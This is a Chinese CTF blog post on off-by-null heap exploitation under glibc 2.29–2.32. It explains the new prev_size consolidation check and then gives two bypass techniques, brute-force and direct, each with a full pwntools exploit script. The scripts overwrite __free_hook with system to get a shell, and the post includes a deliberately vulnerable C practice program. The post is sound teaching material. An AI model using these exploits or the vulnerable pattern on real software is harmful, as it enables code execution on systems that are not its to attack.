
title:  高版本libc(2.29-2.32) off by null利用姿势笔记
categories: [CTF]
tags: [pwn]

---


个人理解off by null 是 off by one的一种特例, off by null指我们可以控制堆块向下一个堆块溢出一个字节的数据，而该数据只能为'\x00'的情况。如果像常规off by one 是溢出任意一个字节，那么就可以修改下一个堆块的大小，而off by null则不能，它仅仅只可以将下一个堆块的inuse位置零.<!--more-->

## 高版本libc改动影响



我们在2.29前 ,我们只需要按照下面来布局堆块:

![image-20210713000221116](image-20210713000221116.png)

然后按照下面步骤:

1. 先释放chunk A.
2. 通过chunk B,利用off by one漏洞在 修改chunk C presize 值为 chunk A size +chunk B size的同时,将chunk C的prev_inuse值覆盖为'\x00'.
3. 再释放chunk C。

![image-20210712235502736](image-20210712235502736.png)

即可让chunk A B C 合并为一块大的chunk。

 但是在2.29后的libc在两个free chunk 进行合并前多一次对`prevsize`的值检查对应的源代码如下:

```c
    /* consolidate backward */
    if (!prev_inuse(p)) {
      prevsize = prev_size (p);
      size += prevsize;
      p = chunk_at_offset(p, -((long) prevsize));
      if (__glibc_unlikely (chunksize(p) != prevsize))
        malloc_printerr ("corrupted size vs. prev_size while consolidating");
      unlink_chunk (av, p);
    }
```

导致我们如果按照上面所说的方法在`if (__glibc_unlikely (chunksize(p) != prevsize))`时,无法成功通过.因为此时`prevsize`为的`A size+ B size`但p的size仅仅为`A size`.

## 爆破法

### 思路

爆破法我借鉴的是nopnoping爷爷的思路：https://nopnoping.github.io/off-by-one%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/

爆破法的思路比较简单:

1.分配一个chunk ,将使下一块chunk地址的后三位抬高为`0x000`,并有机会出现后四位都是`0x0000`的情况.

2.分配一个范围大于tcache的最大值并且在largebin范围内的chunk A.

3.分配一个隔离chunk k.

![image-20210713163115172](image-20210713163115172.png)

4.释放chunk A,在chunk A分配 chunk B,chunk C,chunkD,chunk F ,chunk E.要求chunk C 和chunk  D最好相邻且大小相同,同时让chunk B和 chunk D前14位相同,要求chunk F和chunk E 最好相邻.

5.释放chunk C 和chunk D 让其合并为smallbins,

6.分配chunk G 大小是让chunk G分配后,原chunk A 巧好剩下巧好空间H为chunk C +chunk  D的大小.

7.分配一个大的chunk,让原chunk A 剩下空间H加入smallbins.

8.重新分配chunk C,chunk D.让chunk C  bk 中addr为chunk D.同时修改其bk为 chunk B addr.

9.修改chunk B的bk为fake size，fd修改为chunk C addr .

10.先释放D再释放B，在分配回chunk B ,让原来chunk B fd 位置的值为chunk B addr

+0x10.

11.通过chunk F 修改 chunk E 的`prevsize`值为fake size，并覆盖E的prev_inuse值为0.

 ![image-20210713175759641](image-20210713175759641.png)

12.释放chunk E， B、C、D、F、E合并。

### 例题:qwb_2021_baby_diary 

```python

from pwn import *
import libcfind
#sh=process('./baby_diary')
#sh=remote('8.140.114.72', 1399)
elf=ELF('./baby_diary')

context.arch="amd64"
#context.log_level="debug"

def add(size, content='/bin/sh\x00'):
    sh.recvuntil(">> ")
    sh.sendline("1")
    sh.recvuntil("size: ")
    sh.sendline(str(size))
    sh.recvuntil("content: ")
    sh.sendline(content)

def show(idx):
    sh.recvuntil(">> ")
    sh.sendline("2")
    sh.recvuntil("index: ")
    sh.sendline(str(idx))

def free(idx):
    sh.recvuntil(">> ")
    sh.sendline("3")
    sh.recvuntil("index: ")
    sh.sendline(str(idx))


def pwn2():
    for i in range(7):
        add(0x30)

    add(0x4ba0)#7
    add(0x600)#8

    add(0x20)#9
    free(8)


    add(0x37)#8
    add(0x37)#10 x
    add(0x37)#11 x
    add(0x47)#12 x

    for i in range(7):
        free(i)

    free(11)
    free(10)
    add(0x20)#0
    
    add(0x1000,'l chunk')#2


    add(0x440,p8(0))#1
    add(0x1000,'l chunk')#3


    for i in range(7): #4,5,6,10, 11,13,14
        add(0x30)


    add(0x37,p64(0)+p8(0x10)) #15  x
    add(0x37,'5555555')#16 x

    free(16)
    free(8)

    add(0x37,p64(0x190)+p64(0x101)+p8(0x40))#
    add(0x37,p64(0)*6+p8(0)*6)#16
    free(4)
    free(5)
    free(6)
    free(10)
    free(11)
    free(13)
    free(14)
    free(16)
    free(8)

    for i in range(7):
        add(0x30)
    add(0x37,p8(0x10))
    add(0x37,p8(0x10))

    free(12)
    add(0x47,p64(0)*8+p8(0)*7)
    free(12)
    add(0x47,p64(0)*7+p64(0x10))

    for i in range(7): #17+23
        add(0x20)

    free(17)
    free(18)
    free(19)
    free(20)
    free(21)
    free(22)
    free(23)
    free(0)
    add(0x1000)#0
    gdb.attach(sh)
    add(0x57,'1'*7)#17
#    free(14)
#    add(0x37,p64(1)+p8(0)*8)
    free(14)
    add(0x37,'11122223'+p32(0x61)+p8(0)*4+p8(1)*7)
    free(14)
    add(0x37,'11122223'+p32(0x61)+p8(0)*4+p8(1)*6)
    free(14)
    add(0x37,'11122223'+p32(0x61)+p8(0)*4+p8(1)*5)
    free(14)
    add(0x37,'11122223'+p32(0x61)+p8(0)*4+p8(1)*4)
    free(14)
    add(0x37,'11122223'+p32(0x61)+p8(0)*4+p8(1)*3)
    free(14)
    add(0x37,'11122223'+p32(0x61)+p8(0)*4+p8(1)*2)
    free(14)
    add(0x37,'11122223'+p32(0x61)+p8(0)*4+p8(1)*1)
    free(14)
    add(0x37,'11122223'+p32(0x61)+p8(0)*4)                     
    free(14)
    add(0x37,'11122223'+p32(0x61)+p8(0)*3)    
    show(17)
    addr=u64(sh.recvuntil('\x7f')[-6:].ljust(8,'\x00'))-391
    log.info('main_arena:'+hex(addr))
    malloc=addr-0x10
    log.info('malloc_hook:'+hex(malloc))
    x=libcfind.finder('__malloc_hook',malloc,num=5)

"""
multi libc results:
[-] 0: libc6_2.15-0ubuntu10.23_amd64(source from:ubuntu-eglibc)
[-] 1: libc6-amd64_2.30-0ubuntu2.2_i386(source from:ubuntu-old-glibc)
[-] 2: libc6_2.30-0ubuntu2_amd64(source from:ubuntu-old-glibc)
[-] 3: libc6-amd64_2.31-0ubuntu9.2_i386(source from:ubuntu-glibc)
[-] 4: libc6_2.31-0ubuntu9_amd64(source from:ubuntu-glibc)
[-] 5: local-ad9f264101ca975f82b40fffd5aa6f763cfd1ed9(source from:/usr/lib/x86_64-linux-gnu/libc-2.31.so)
[-] 6: libc6-amd64_2.30-0ubuntu2_i386(source from:ubuntu-old-glibc)
[-] 7: libc6-amd64_2.31-0ubuntu9_i386(source from:ubuntu-glibc)
[-] 8: libc6_2.31-0ubuntu9.2_amd64(source from:ubuntu-glibc)
[-] 9: libc6_2.30-0ubuntu2.2_amd64(source from:ubuntu-old-glibc)
[!] you can choose it by hand
    """

    add(0x57,'22222')
    free(18)
    free(17)
    free(14)
    add(0x37,'11122223'+p32(0x61)+p8(0)*4+p64(x.dump('__free_hook')))#14
    add(0x57)#17
    add(0x57,p64(x.dump('system'))) #18
    free(0)
    #add(0x57,'')#18
 #   free(1)
    

if __name__ == "__main__":
    
    while True:
        sh=process("./baby_diary")
        #sh=remote('8.140.114.72', 1399)
        try:
            pwn2()
            gdb.attach(sh)
            sh.interactive()
        except:
            sh.close()

```

## 直接法

直接法我是在wjh爷爷的博客上了解的http://blog.wjhwjhn.com/archives/193/

这个方法有关弊端，如果题目`\n`不能替换‘\x00’就需要题目有show功能，否则还是得爆。

### 思路

1.创造4个大于tcache的最大值并且在largebin范围内的chunk A、B、C、D。让B、C相邻外，其他chunk 间都有隔离块隔离同时chunk C的地址为末位为`0x00`。

2.按照顺序释放A、C、D，形成largebins 链表。

![image-20210713184123575](image-20210713184123575.png)

3.释放chunk B，让chunk B和chunk C产生合并。

![image-20210713184333651](image-20210713184333651.png)

4.创建大小比原来chunk B多0x20size 的new chunk B。让old chunk C的 old fd 与old bk保留在new chunk 底部。创建大小比原来chunk C少0x20size 的new chunk C。

5.将chunk A和chunk B复原。

![image-20210713185405449](image-20210713185405449.png)

6.按照顺序释放 A、new C、D，形成largebins 链表。

7.修改chunk A bf 值为old chunk C addr。修改chunk D fd 值为old chunk C addr。

8.通过new chunk B修改  old chunk C size 为fake size。通过new chunk C 修改隔离chunk的`prevsize`值为fake size，

 ![image-20210713190210228](image-20210713190210228.png)

9.free 隔离chunk即出现合并。

### 例题

没有找到合适的，于是选来自nopnoping爷爷博客的例题，源码：

```c
#include<stdio.h>
struct chunk{
	long *point;
	unsigned int size;
}chunks[10];
void add()
{
	unsigned int index=0;
	unsigned int size=0;
	puts("Index?");
	scanf("%d",&index);
	if(index>=10)
	{
		puts("wrong index!");
		exit(0);
	}
	puts("Size?");
	scanf("%d",&size);
	chunks[index].point=malloc(size);
	if(!chunks[index].point)
	{
		puts("malloc error!");
		exit(0);
	}
	chunks[index].size=size;
}
void show()
{
	unsigned int index=0;
	puts("Index?");
	scanf("%d",&index);
	if(index>=10)
	{
		puts("wrong index!");
		exit(0);
	}
	if(!chunks[index].point)
	{
		puts("It's blank!");
		exit(0);
	}
	puts(chunks[index].point);
}
void edit()
{
	unsigned int index;
	puts("Index?");
	scanf("%d",&index);
	if(index>=10)
	{
		puts("wrong index!");
		exit(0);
	}
	if(!chunks[index].point)
	{
		puts("It's blank!");
		exit(0);
	}
	char *p=chunks[index].point;
	puts("content:");
	p[read(0,chunks[index].point,chunks[index].size)]=0;
}
void delete()
{
	unsigned int index;
	puts("Index?");
	scanf("%d",&index);
	if(index>=10)
	{
		puts("wrong index!");
		exit(0);
	}
	if(!chunks[index].point)
	{
		puts("It's blank!");
		exit(0);
	}
	free(chunks[index].point);
	chunks[index].point=0;
	chunks[index].size=0;
}
void menu()
{
	puts("1) add a chunk");
	puts("2) show content");
	puts("3) edit a chunk");
	puts("4) delete a chunk");
	putchar('>');
}
void main()
{
	unsigned int choice;
	puts("Welcome to my off by null vuln vulnerability exercise.");
	puts("wish you will play happy!");
	while(1)
	{
		menu();
		scanf("%d",&choice);
		switch(choice)
		{
			case 1:
				add();
				break;
			case 2:
				show();
				break;
			case 3:
				edit();
				break;
			case 4:
				delete();
				break;
			default:
				exit(0);
		}
	}

}

```

exp：

```python
from pwn import *
import libcfind

e=ELF('./text')


def add(num,size):
    p.sendline('1')
    p.recvuntil('Index?')
    p.sendline(str(num))
    p.recvuntil('Size?')
    p.sendline(str(size))

def show(num):
    p.sendline('2')
    p.recvuntil('Index?')
    p.sendline(str(num))


def edit(num,text=''):
    p.sendline('3')
    p.recvuntil('Index?') 
    p.sendline(str(num))   
    p.recvuntil("content:")
    p.send(text)

def free(num):
    p.sendline('4')
    p.recvuntil('Index?\n')
    p.sendline(str(num))
    
def pwn():
 #1.创造4个大于tcache的最大值并且在largebin范围内的chunk A、B、C、D。
    add(0,0x450)
    add(1,0x80)
    add(2,0x450)
    add(3,0x450)
    add(4,0x4f0)
    add(5,0x450)
    add(6,0x80)
#按照顺序释放A、C、D，形成largebins 链表。
    free(5)
    free(3)
    free(0)
#释放chunk B，让chunk B和chunk C产生合并
    free(2)
#让old chunk C的 old fd 与old bk保留在new chunk 底部。
    add(2,0x470)
    add(3,0x430)
#复原chunk
    add(5,0x450)
    add(0,0x450)

    free(0)
    free(3)
    free(5)
#修改chunk A bf 值为old chunk C addr。修改chunk D fd 值为old chunk C addr。
#(这里体现方法的一个弊端，如果`\n`不能替换‘\x00’就需要题目有show功能)
    add(0,0x450) #bk
    add(3,0x430)
    add(5,0x450) 
    edit(0,p8(0)*7+'\n')

    free(5)
    free(3)
    add(6,0x500)
    add(5,0x450)
    show(5)
    p.recvline()
    fd=(u64(p.recvline()[:-1].ljust(8,'\x00'))-0x20)
    #fd=p.recvline()
    print(hex(fd))
    add(3,0x438)
    edit(5,p64(fd))
#通过new chunk B修改  old chunk C size 为fake size。通过new chunk B修改  old chunk C size 为fake size。（这里就用残留的0x460）通过new chunk C 修改隔离chunk的`prevsize`值为fake size，
    edit(3,p8(0)*0x430+p64(0x460))
#
    free(4)
    add(0,0x100)
    print(hex(fd))
    add(1,0x100)
    show(1)
    main_arena=(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))-96)
    #fd=p.recvline()
    print(hex(main_arena))
    malloc_hook=main_arena-0x10
    x=libcfind.finder('__malloc_hook',malloc_hook,num=5)
    """
[-] 0: libc6_2.15-0ubuntu10.23_amd64(source from:ubuntu-eglibc)
[-] 1: libc6-amd64_2.30-0ubuntu2.2_i386(source from:ubuntu-old-glibc)
[-] 2: libc6_2.30-0ubuntu2_amd64(source from:ubuntu-old-glibc)
[-] 3: libc6-amd64_2.31-0ubuntu9.2_i386(source from:ubuntu-glibc)
[-] 4: libc6_2.31-0ubuntu9_amd64(source from:ubuntu-glibc)
[-] 5: local-ad9f264101ca975f82b40fffd5aa6f763cfd1ed9(source from:/usr/lib/x86_64-linux-gnu/libc-2.31.so)
[-] 6: libc6-amd64_2.30-0ubuntu2_i386(source from:ubuntu-old-glibc)
[-] 7: libc6-amd64_2.31-0ubuntu9_i386(source from:ubuntu-glibc)
[-] 8: libc6_2.31-0ubuntu9.2_amd64(source from:ubuntu-glibc)
[-] 9: libc6_2.30-0ubuntu2.2_amd64(source from:ubuntu-old-glibc)
    """
    free(1)
    free(0)
    edit(2,0x420*p8(0)+p64(0)*7+p64(0x111)+p64(x.dump('__free_hook')))
    print('ok1')
    
    add(0,0x100)
    edit(0,'/bin/sh\x00\n')
    print('ok1')
    add(1,0x100)
    edit(1,p64(x.dump('system')))
    free(0)

def leak():
    addr=u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))-96
    log.info('main_arena:'+hex(addr))
    malloc_hook=addr-0x10
    log.info('malloc_hook:'+hex(malloc_hook))
    x=libcfind.finder('__malloc_hook',malloc_hook,num=5)
    log.info('base:'+hex(x.libcbase))
    """
    multi libc results:
[-] 0: libc6_2.15-0ubuntu10.23_amd64(source from:ubuntu-eglibc)
[-] 1: libc6-amd64_2.30-0ubuntu2.2_i386(source from:ubuntu-old-glibc)
[-] 2: libc6_2.30-0ubuntu2_amd64(source from:ubuntu-old-glibc)
[-] 3: libc6-amd64_2.31-0ubuntu9.2_i386(source from:ubuntu-glibc)
[-] 4: libc6_2.31-0ubuntu9_amd64(source from:ubuntu-glibc)
[-] 5: local-ad9f264101ca975f82b40fffd5aa6f763cfd1ed9(source from:/usr/lib/x86_64-linux-gnu/libc-2.31.so)
[-] 6: libc6-amd64_2.30-0ubuntu2_i386(source from:ubuntu-old-glibc)
[-] 7: libc6-amd64_2.31-0ubuntu9_i386(source from:ubuntu-glibc)
[-] 8: libc6_2.31-0ubuntu9.2_amd64(source from:ubuntu-glibc)
[-] 9: libc6_2.30-0ubuntu2.2_amd64(source from:ubuntu-old-glibc)
    """
    free(9)
    free(8)
    edit(7,p64(0)+p64(0x71)+p64(x.dump('__free_hook')))
    print('ok1')
    add(8,0x60)
    add(9,0x60)
    print('ok2')
    edit(8,'/bin/sh\x00')
    edit(9,p64(x.dump('system')))
    print('ok3')
    free(8)
    print('ok4')

p=process('./text')
pwn()
gdb.attach(p)
p.interactive()
```

## 后记

off by null 自从qwb被打懵后一直想了解这个知识，但又是毕业那些一大堆事情。同时tcl看了很多文章才看懂。感谢wjh爷爷和nopnoping爷爷的文章。

## 参考文献

https://nopnoping.github.io/off-by-one%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/

http://blog.wjhwjhn.com/archives/193/